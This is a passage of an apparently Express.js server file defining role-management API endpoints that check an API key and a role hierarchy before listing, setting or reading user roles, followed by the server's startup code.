  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false });
  if (!hasRolePermission(user.role, PERMISSION_LEVELS.FOUNDER)) {
    return res.status(403).json({ valid: false, error: 'Only founder/developer can view role list' });
  }
  const roles = Object.keys(roleHierarchy).map(role => ({
    role,
    level: roleHierarchy[role],
    canManage: canManageUser(user.role, role)
  }));
  res.json({ valid: true, roles });
});

app.post('/api/role/set', (req, res) => {
  const { key, username, newRole } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false });
  const target = db.find(u => u.username === username);
  if (!target) return res.status(404).json({ valid: false, error: 'User not found' });
  if (!canManageUser(user.role, target.role)) {
    return res.status(403).json({ valid: false, error: `Cannot manage ${target.role} with role ${user.role}` });
  }
  if (!roleHierarchy[newRole?.toLowerCase()]) {
    return res.status(400).json({ valid: false, error: 'Invalid role' });
  }
  if (getRoleLevel(newRole) >= getRoleLevel(user.role)) {
    return res.status(403).json({ valid: false, error: 'Cannot set role higher than or equal to your own role' });
  }
  target.role = newRole.toLowerCase();
  saveDatabase(db);
  console.log(`[ROLE] ${user.username} set ${target.username} → ${newRole}`);
  res.json({ valid: true, message: `Role updated: ${username} → ${newRole}` });
});

app.get('/api/role/get', (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false });
  const target = db.find(u => u.username === username);
  if (!target) return res.status(404).json({ valid: false, error: 'User not found' });
  if (!canManageUser(user.role, target.role) && user.username !== target.username) {
    return res.status(403).json({ valid: false, error: 'Insufficient permissions' });
  }
  res.json({
    valid: true,
    username: target.username,
    role: target.role || 'member',
    level: getRoleLevel(target.role)
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://cp.zyrostore.id:3594:${PORT}`);
  startUserSessions();
  kirimStatusServer("✅ Server aktif dan berjalan normal.");
});